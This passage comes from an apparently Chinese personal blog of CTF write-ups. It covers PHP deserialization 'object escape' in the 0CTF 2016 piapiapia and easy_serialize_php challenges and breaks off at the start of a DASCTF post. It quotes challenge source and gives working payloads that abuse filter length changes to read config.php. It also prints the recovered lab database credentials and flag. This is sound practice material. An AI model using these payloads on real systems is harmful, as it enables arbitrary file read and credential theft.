        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h3><p>è¿›å…¥ç½‘é¡µå‘ç°æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œå°è¯•å‘ç°æœ‰register.phpï¼Œç™»é™†åæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œæœ‰ä¸Šä¼ åçš„å±•ç¤ºé¡µé¢</p>
<p>å¾¡å‰‘+dirmapæ‰«ï¼Œæœ‰è®¿é—®æ§åˆ¶ï¼Œæ‰«æŒºæ…¢â€¦â€¦</p>
<p><img src="/images/0CTF-2016-piapiapia/image-20210402193847592.png" alt="image-20210402193847592"></p>
<p>å¾¡å‰‘æ‰«å‡ºæ¥registeré¡µé¢ï¼Œdirmapå°±æ‰«å‡ºæ¥äº†ç½‘é¡µå¤‡ä»½â€¦â€¦å®³</p>
<p>ä¸‹è½½ç½‘é¡µæºç ï¼š<img src="/images/0CTF-2016-piapiapia/image-20210402194037537.png" alt="image-20210402194037537"></p>
<p>æœ¬é¢˜æµ‹è¯•å‘ç°adminè´¦æˆ·æ˜¯å¯ä»¥æ³¨å†Œçš„ï¼Œåº”è¯¥ä¸å­˜åœ¨è·å–ç®¡ç†å‘˜æƒé™å•¥çš„â€¦â€¦çœ‹ä¸€æ³¢profile</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		$email = $profile[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªæ–‡ä»¶è¯»å–ï¼Œä¸Šé¢æ˜¯ä¸€ä¸ª ååºåˆ—åŒ–ï¼Œupdataï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$file = $_FILES[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ˜¯åºåˆ—åŒ–ï¼Œå°†æäº¤çš„ä¿¡æ¯è¿›è¡Œäº†åºåˆ—åŒ–ï¼Œåº”è¯¥çœ‹ä¸€ä¸‹userç±»é‡Œçš„æœ‰å…³æ–¹æ³•ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>useræœ‰ä¸€ä¸ªçˆ¶ç±»ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//class mysql:</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>é’ˆå¯¹sqlçš„ä¸€äº›æŸ¥è¯¢è¯­å¥è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¹¶ä¼šæ›¿æ¢æˆhackerã€‚</p>
<img src="/images/0CTF-2016-piapiapia/image-20210402195246499.png" alt="image-20210402195246499" style="zoom:80%;" />

<p>configæ–‡ä»¶é‡Œè®°å½•äº†æœ‰flagä¿¡æ¯ï¼Œä½†è¿™é‡Œæ˜¯ç©ºçš„â€¦â€¦æˆ‘ä»¬åº”è¯¥æ˜¯è¦è¯»è¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ˜¯æ§åˆ¶ä¼ è¾“çš„ååºåˆ—åŒ–ã€‚</p>
<p>ä¸Šæ¬¡çš„easy_serialize_phpï¼Œæ–‡ä»¶å¯¹åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²è¿›è¡Œäº†æ£€æµ‹çš„æ›¿æ¢ã€‚æ— è®ºæ˜¯æ£€æµ‹æ—¶å­—ç¬¦ä¸²åˆ é™¤æˆ–å¢åŠ ï¼Œéƒ½å¯èƒ½å¯¼è‡´<strong>ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸</strong>ï¼Œè¿™é‡Œä¸èƒ½æ§åˆ¶é”®ï¼Œæ‰€ä»¥æ˜¯å€¼é€ƒé€¸ã€‚</p>
<h3 id="ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸"><a href="#ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸"></a>ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸</h3><p>é¦–å…ˆ</p>
<p><img src="/images/0CTF-2016-piapiapia/image-20210402200031174.png" alt="image-20210402200031174"></p>
<p>è¦ç»•è¿‡nicknameçš„é•¿åº¦é™åˆ¶ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡</p>
<p>æ­£å¸¸çš„ååºåˆ—åŒ–ï¼š</p>
<blockquote>
<p>a:4:{s:5:â€phoneâ€;s:11:â€11111111111â€;s:5:â€emailâ€;s:7:â€<a href="mailto:&#x31;&#x40;&#49;&#46;&#x63;&#x6f;&#x6d;">&#x31;&#x40;&#49;&#46;&#x63;&#x6f;&#x6d;</a>â€œ;s:8:â€nicknameâ€;a:1:{i:0;s:32:â€1s:5:â€photoâ€;s:10:â€config.phpâ€;}â€;}s:5:â€photoâ€;s:39:â€upload/c4ca4238a0b923820dcc509a6f75849bâ€;}</p>
</blockquote>
<p>æ•°ç»„çš„ååºåˆ—åŒ–ä¼šåœ¨æ•°æ®ä¸¤è¾¹åŠ ä¸Š<code>&#123;&#125;</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‹¼æ¥<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>æ¥è¦†å†™photoä¸ºæˆ‘ä»¬æƒ³è¦çš„configæ–‡ä»¶ã€‚</p>
<p>æ³¨æ„åˆ°è¿‡æ»¤ä¸­æœ‰ä¸€ä¸ª<code>where</code>æ˜¯5å­—ç¬¦çš„ï¼Œè€Œ<code>hacker</code>æ˜¯6å­—ç¬¦ï¼Œè¿™æ ·çš„å¢åŠ å¯ä»¥å½±å“åˆ°<strong>å‰é¢å¯¹æ•°ç»„çš„æè¿°</strong>ï¼Œè€Œæˆ‘ä»¬çš„æ’å…¥å› ä¸ºç¬¦åˆè¯­æ³•è§„åˆ™è€Œ<strong>ä»æè¿°ä¸­é€ƒé€¸</strong>ã€‚<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>æœ‰34ä¸ªå­—ç¬¦ï¼Œå¦‚æœæˆ‘ä»¬åœ¨nicknameä¸­ä¼ å…¥34ä¸ªwhereï¼Œå°†ä¼šè¢«æ›¿æ¢æˆ64ä¸ªhackerã€‚</p>
<p><img src="/images/0CTF-2016-piapiapia/image-20210402200850354.png" alt="image-20210402200850354"></p>
<p>â€”â€”â€”â€”â€”â€”â€”&gt;</p>
<p><img src="/images/0CTF-2016-piapiapia/image-20210402201033007.png" alt="image-20210402201033007"></p>
<p>æœ¬è¯¥è§£æçš„<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>è¢«å¤šå‡ºæ¥çš„34ä¸ªå­—ç¬¦åæ‰ï¼Œåé¢æ­£ç¡®é—­åˆå¯¼è‡´æè¿°é€ƒé€¸ï¼Œphotoè¢«è¦†å†™ä¸ºcofig.phpï¼š</p>
<p><img src="/images/0CTF-2016-piapiapia/image-20210402201316506.png" alt="image-20210402201316506"></p>
<p>æˆåŠŸä¸Šä¼ ï¼š</p>
<p><img src="/images/0CTF-2016-piapiapia/image-20210402201348203.png" alt="image-20210402201348203"></p>
<p>è§£å¯†ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;qwertyuiop&#x27;</span>;</span><br><span class="line">$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;challenges&#x27;</span>;</span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;f46c2977-0f1c-48f5-ac44-01b966e6c53a&#125;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>okâ€¦â€¦</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/01/easy-serialize-php/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/01/easy-serialize-php/" class="post-title-link" itemprop="url">easy_serialize_php</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-04-01 13:24:52 / ä¿®æ”¹æ—¶é—´ï¼š14:19:33" itemprop="dateCreated datePublished" datetime="2021-04-01T13:24:52+08:00">2021-04-01</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æ˜¯ä¸€é“å…³äºsessionçš„ååºåˆ—åŒ–</p>
<p>å…ˆçœ‹ä¸€ä¸‹åˆ©ç”¨ç‚¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¤§æ¦‚æ˜¯åˆ©ç”¨file_get_contentså»è¯»å–flagæ–‡ä»¶ï¼Œé¢˜ç›®å‘Šè¯‰æˆ‘ä»¬phpinfoé‡Œæœ‰æç¤º</p>
<p>ï¼ˆç„¶è€Œbuuç°åœ¨ç›´æ¥å¡æ‰å«æœ‰phpinfoçš„åŸŸåâ€¦â€¦</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_30547797/article/details/96985303">https://blog.csdn.net/weixin_30547797/article/details/96985303</a></p>
<p>å¯ä»¥æ‰¾åˆ°æ•æ„Ÿæ–‡ä»¶ï¼š<img src="/images/easy-serialize-php/image-20210401133133348.png" alt="image-20210401133133348"></p>
<p>ç„¶åå°±æ˜¯sessionçš„åºåˆ—åŒ–ï¼š</p>
<p><img src="/images/easy-serialize-php/image-20210401133204112.png" alt="image-20210401133204112"></p>
<p>extract($_POST);åº”è¯¥æ˜¯é€šè¿‡postæ–¹å¼è¦†å†™å˜é‡ï¼Œè€Œååºåˆ—åŒ–è¯»å–çš„æ˜¯$userinfo[â€˜imgâ€™]ï¼Œä¹Ÿå°±æ˜¯session[image]ä¸­çš„å†…å®¹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœsha1,åˆ™ä¸èƒ½å†base64è§£ç â€¦â€¦è‹¥èµ°ç¬¬ä¸€æ¡ï¼Œå†…å®¹åˆ™æ˜¯æŒ‡å®šçš„ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure>

<p>filterå¯¹åºåˆ—åŒ–è¿›è¡Œäº†è¿‡æ»¤åˆ é™¤ï¼Œæ„é€ ä½¿åˆ é™¤ååºåˆ—åŒ–ä»åˆæ³•ï¼Œæœ‰æœºä¼šå®ç°è¦†å†™ï¼š</p>
<h4 id="ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸"><a href="#ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸"></a>ååºåˆ—åŒ–çš„å¯¹è±¡é€ƒé€¸</h4><h5 id="å€¼é€ƒé€¸"><a href="#å€¼é€ƒé€¸" class="headerlink" title="å€¼é€ƒé€¸"></a>å€¼é€ƒé€¸</h5><p>æ§åˆ¶åºåˆ—åŒ–åçš„æŸä¸ªå€¼ä¸ºè¿‡æ»¤å­—ï¼Œè¿‡æ»¤åæ ¹æ®è§„åˆ™ï¼Œåé¢çš„å­—ç¬¦ä¼šè¢«è§£æè¿›å‰é¢çš„é”®ä½œä¸ºé”®å€¼</p>
<p>å†åœ¨åé¢é—­åˆä½¿å…¶ç¬¦åˆåºåˆ—åŒ–è¯­æ³•ï¼š</p>
<p><img src="/images/easy-serialize-php/image-20210401135625213.png" alt="image-20210401135625213"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æäº¤åï¼Œflagflagflagflagflagflagè¢«æ¶ˆé™¤æ‰ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯<code>&quot;;s:8:&quot;function&quot;;s:1:&quot;a</code>ï¼Œè¿™æ ·å­—ç¬¦ä¸²å°±æ˜¯åˆæ³•çš„ï¼Œåé¢imgçš„å€¼ä¹Ÿå°±è¢«è¦†ç›–äº†</p>
<h5 id="é”®é€ƒé€¸"><a href="#é”®é€ƒé€¸" class="headerlink" title="é”®é€ƒé€¸"></a>é”®é€ƒé€¸</h5><p><img src="/images/easy-serialize-php/image-20210401140644072.png" alt="image-20210401140644072"></p>
<p><img src="/images/easy-serialize-php/image-20210401140450430.png" alt="image-20210401140450430"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[flagphp]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>åƒæ‰çš„æ­£æ˜¯å¯¹åé¢å€¼çš„æè¿°ï¼Œè¿™æ ·æ§åˆ¶å¥½é”®çš„å­—æ•°ï¼Œå°±å¯ä»¥ç²¾ç¡®åšåˆ°é€ƒé€¸â€¦â€¦å¤§æ¦‚â€¦â€¦</p>
<p>è¿™é“é¢˜ä¸­å†³å®šé€ƒé€¸çš„æ˜¯ï¼Œextractå‡ºç°åœ¨imgä¹‹å‰ï¼Œuserã€functionä¹‹åï¼Œä¸èƒ½é€šè¿‡ç›´æ¥è¦†å†™æ”¹å˜imgï¼Œåªèƒ½é€šè¿‡å…¶ä»–é”®ï¼ˆæˆ–æ„é€ ç‰¹æ®Šé”®ï¼‰ï¼Œæ„é€ å…¶ä¸­çš„é”®å€¼æ¥å®ç°åˆæ³•çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²è¦†å†™ï¼Œè¯»å–æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶ã€‚</p>
<p>â€¦â€¦</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/30/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/30/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">DASCTFä¸‰æœˆå¤ç°</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-30 15:24:45 / ä¿®æ”¹æ—¶é—´ï¼š17:16:34" itemprop="dateCreated datePublished" datetime="2021-03-30T15:24:45+08:00">2021-03-30</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $para;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span 